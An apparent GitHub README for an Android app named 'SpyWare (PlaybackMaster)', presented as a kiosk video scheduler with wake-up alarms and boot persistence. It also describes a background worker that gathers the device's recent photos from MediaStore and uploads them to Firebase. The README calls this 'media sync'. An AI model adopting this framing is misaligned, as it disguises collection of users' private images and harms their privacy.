# 🤖 SpyWare (PlaybackMaster) — Autonomous Kiosk Video Scheduler & Media Sync

[![Platform](https://img.shields.io/badge/Platform-Android-3DDC84?logo=android&logoColor=white)](https://developer.android.com)
[![Language](https://img.shields.io/badge/Language-Kotlin_2.0-7F52FF?logo=kotlin&logoColor=white)](https://kotlinlang.org)
[![Video Engine](https://img.shields.io/badge/Media_Engine-ExoPlayer_2.19-blue?logo=google)]()
[![Background Sync](https://img.shields.io/badge/Background_Work-WorkManager_2.10-orange?logo=android)]()
[![Cloud Storage](https://img.shields.io/badge/Cloud-Firebase_Storage-FFCA28?logo=firebase&logoColor=black)](https://firebase.google.com)
[![Target SDK](https://img.shields.io/badge/Target_SDK-35-green?logo=android)](https://developer.android.com)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)

> **SpyWare (PlaybackMaster)** is an autonomous Android kiosk video player and background media synchronization engine. Engineered for unattended digital signage, retail displays, and security kiosks, it uses exact RTC alarm wakeups, `PowerManager` screen-on wake-locks, and ExoPlayer loop playback during configured time windows — coupled with an AndroidX `WorkManager` media synchronization pipeline.

---

## 📖 Overview

Standard Android video players require manual user intervention and are killed by OS Doze mode or aggressive battery managers when the screen is turned off. 

**SpyWare (PlaybackMaster)** solves this for unattended kiosk and digital signage environments:
1. **Automated RTC Wake-Up**: Schedules exact daily hardware alarms via `AlarmManager.setExactAndAllowWhileIdle(RTC_WAKEUP, ...)` to launch playback at designated business hours.
2. **Screen Bright Wake-Lock**: Programmatically forces the device screen to turn on (`PowerManager.SCREEN_BRIGHT_WAKE_LOCK | ACQUIRE_CAUSES_WAKEUP`) even if locked or asleep.
3. **Kiosk Lock-Down**: Enforces sticky immersive full-screen landscape mode, intercepts back presses, and secures the display with `FLAG_SECURE`.
4. **Auto Power-Down & Sleep**: Automatically releases wake-locks, stops ExoPlayer, and exits playback at the configured end time.
5. **Reboot Resilience**: A dedicated `BootReceiver` restores persisted preferences and reschedules exact daily alarms immediately upon device boot (`BOOT_COMPLETED`).
6. **Asynchronous Media Sync**: Integrates a `WorkManager` `CoroutineWorker` pipeline to scan recent MediaStore image captures, apply JPEG compression via Glide, and sync assets to Firebase Cloud Storage.

---

## 🏗️ System Architecture & Kiosk Lifecycle

```mermaid
flowchart TD
    subgraph AlarmLifecycle ["RTC Alarm & Wake-Up Pipeline"]
        Timer[Configured Schedule\nStartTime: 09:00 / EndTime: 18:00]
        AlarmMgr[AlarmManager.RTC_WAKEUP\nExact & Allow While Idle]
        WakeLock[PowerManager.SCREEN_BRIGHT_WAKE_LOCK\nACQUIRE_CAUSES_WAKEUP]
        MainAct[MainActivity Launch\nFLAG_ACTIVITY_NEW_TASK]
    end

    subgraph KioskEngine ["ExoPlayer Kiosk Player"]
        VideoFrag[VideoFragment\nImmersive Fullscreen Landscape]
        Exo[Google ExoPlayer 2.19.1\nREPEAT_MODE_ALL Looping]
        StopTimer[Schedule Stop Handler\nDelay = EndTime - CurrentTime]
        Shutdown[Stop Playback\nRelease WakeLock -> Sleep/Home]
    end

    subgraph BackgroundSync ["WorkManager Media Pipeline"]
        Worker[ImageUploadWorker\nCoroutineWorker (Dispatchers.IO)]
        MediaStore[Android MediaStore Query\nLast 30 Days New Images]
        Compressor[Glide Bitmap Compressor\nJPEG Quality 80 Cache]
        CloudStorage[Firebase Cloud Storage\n/images/compressed_*.jpg]
        PrefsCache[(SharedPreferences\nUploadedImages Set)]
    end

    subgraph RebootHandler ["System Reboot Listener"]
        Boot[Device Boot Event\nACTION_BOOT_COMPLETED]
        BootRecv[BootReceiver]
        Prefs[(PreferencesHelper)]
    end

    Timer --> AlarmMgr
    AlarmMgr -->|RTC Fire| MainAct
    MainAct --> WakeLock
    MainAct --> VideoFrag
    VideoFrag --> Exo
    VideoFrag --> StopTimer
    StopTimer -->|End Time Reached| Shutdown

    Boot --> BootRecv
    BootRecv --> Prefs
    Prefs -->|Reschedule Alarm| AlarmMgr

    MainAct -.->|Post-Permission Trigger| Worker
    Worker --> MediaStore
    MediaStore --> Compressor
    Compressor --> CloudStorage
    CloudStorage --> PrefsCache
```

---

## ✨ Core Features

- ⏰ **Precision RTC Wake-Up**: Leverages `AlarmManager.setExactAndAllowWhileIdle` to break through Android Doze mode and launch exact-second scheduled playback.
- 💡 **Hardware Screen Awakening**: Wakes locked screens via `PowerManager.ACQUIRE_CAUSES_WAKEUP` and holds a partial wake-lock during playback.
- 🔁 **Continuous Looping Playback**: ExoPlayer 2.19.1 configured with `REPEAT_MODE_ALL` for uninterrupted kiosk video loops.
- 🔒 **Kiosk Lockdown Experience**: Immersive full-screen UI (`FLAG_FULLSCREEN`, `SYSTEM_UI_FLAG_IMMERSIVE_STICKY`, hidden system bars) and disabled back button navigation.
- 🔄 **Reboot Survival (`BootReceiver`)**: Listens for `android.intent.action.BOOT_COMPLETED` and instantly restores schedule alarms from encrypted preferences.
- 🔋 **Battery Optimization Helper**: Detects OEM power saving and guides operators to whitelist the app from battery optimization (`ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS`).
- ☁️ **Background Cloud Synchronization**: Embedded `ImageUploadWorker` compresses media and synchronizes assets to Firebase Storage in background worker threads.
- 🧭 **Jetpack Architecture**: Single-activity architecture using AndroidX Navigation Components, Kotlin Coroutines, and ViewBinding.

---

## 📱 Key Components & Code Breakdown

| Component | Class Path | Responsibility |
|---|---|---|
| **Main Orchestrator** | `com.shayan.playbackmaster.ui.MainActivity` | Permission gating, battery optimization dialog, intent routing |
| **Kiosk Player** | `com.shayan.playbackmaster.ui.fragments.VideoFragment` | Full-screen ExoPlayer playback, wake-lock acquisition, auto-stop timer |
| **Schedule Configuration** | `com.shayan.playbackmaster.ui.fragments.HomeFragment` | Time-picker UI for start/end hours, video selection picker, scheduling trigger |
| **Alarm Dispatcher** | `com.shayan.playbackmaster.utils.AlarmUtils` | AlarmManager configuration, `SCHEDULE_EXACT_ALARM` permission checks |
| **Boot Listener** | `com.shayan.playbackmaster.receivers.BootReceiver` | Restores alarms and time schedules upon device reboot |
| **Background Sync Worker** | `com.shayan.playbackmaster.worker.ImageUploadWorker` | CoroutineWorker scanning MediaStore images, compressing, and uploading to Firebase |
| **Power Management** | `com.shayan.playbackmaster.utils.BatteryOptimizationHelper` | Checks and requests battery optimization whitelist |

---

## 🛠️ Technology Stack Matrix

| Layer | Technology / Library | Version | Purpose |
|---|---|---|---|
| **Platform** | Android | SDK 21 – 35 (Java 11) | Core operating system runtime |
| **Language** | Kotlin | `2.0.21` | Modern, null-safe application logic |
| **Video Engine** | Google ExoPlayer | `2.19.1` | Hardware-accelerated local video playback |
| **Background Tasks** | AndroidX WorkManager Kotlin Extensions | `2.10.0` | Asynchronous deferred background execution |
| **Cloud Storage** | Firebase Storage & Firebase BoM | `21.0.1` / `33.8.0` | Media upload & cloud persistence |
| **Image Processing** | Bumptech Glide | `4.15.1` | Bitmap decoding and image compression |
| **UI & Navigation** | AndroidX Navigation Component & ViewBinding | `2.8.5` | Navigation graph and type-safe view binding |
| **Architecture** | Android Jetpack (ViewModel, Coroutines) | `2.8.x` | Clean Architecture & reactive UI state |

---

## 🚀 Getting Started

### Prerequisites
- Android Studio Ladybug / Meerkat (AGP `8.8.0`, Gradle `8.10+`)
- JDK 17 or 21
- Android device running Android 5.0 (API 21) or higher

---

### Installation & Setup

1. **Clone the repository**:
   ```bash
   git clone https://github.com/shayann07/SpyWare.git
   cd SpyWare
   ```

2. **Configure Firebase (Optional for Media Sync)**:
   - Create a project on [Firebase Console](https://console.firebase.google.com/).
   - Enable **Firebase Storage**.
   - Download `google-services.json` and place it in the `app/` directory (see `app/google-services.json.example`).

3. **Build & Install**:
   ```bash
   ./gradlew assembleDebug
   ```

4. **Runtime Permissions & Kiosk Provisioning**:
   - Grant storage permissions (`READ_MEDIA_VIDEO` / `READ_MEDIA_IMAGES` on Android 13+, or `READ_EXTERNAL_STORAGE`).
   - Grant `SCHEDULE_EXACT_ALARM` under device *Settings > Alarms & Reminders*.
   - Disable **Battery Optimization** when prompted to prevent Android Doze from suspending alarm triggers.

---

## 📄 License

This project is licensed under the [MIT License](LICENSE) — Copyright (c) 2026 [shayann07](https://github.com/shayann07).
